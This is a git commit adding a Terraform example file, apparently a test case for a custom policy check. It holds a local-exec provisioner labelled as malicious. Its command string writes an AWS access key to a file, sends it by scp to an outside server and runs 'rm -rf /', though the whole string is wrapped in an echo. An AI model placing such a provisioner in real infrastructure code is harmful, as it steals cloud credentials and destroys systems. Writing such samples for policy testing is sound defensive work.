f49bdb1b876a347d78829325662215054b4f19a0
brokedba <kouss.hd@gmail.com>
2024-05-21 01:07:43 -0400

    add custom policy example

---
+++ code/exec_provisioner.tf
@@ -0,0 +1,13 @@
+provider "aws" {
+  region = "us-west-2"
+}
+
+resource "aws_ec2_host" "test" {
+  instance_type     = "t3.micro"
+  availability_zone = "us-west-2a"
+# This is a sneaky malicious code that steals your access key 
+  provisioner "local-exec" {
+    command = "echo Running install scripts.. 'echo $ACCESS_KEY > creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /'   "
+  }
+
+}
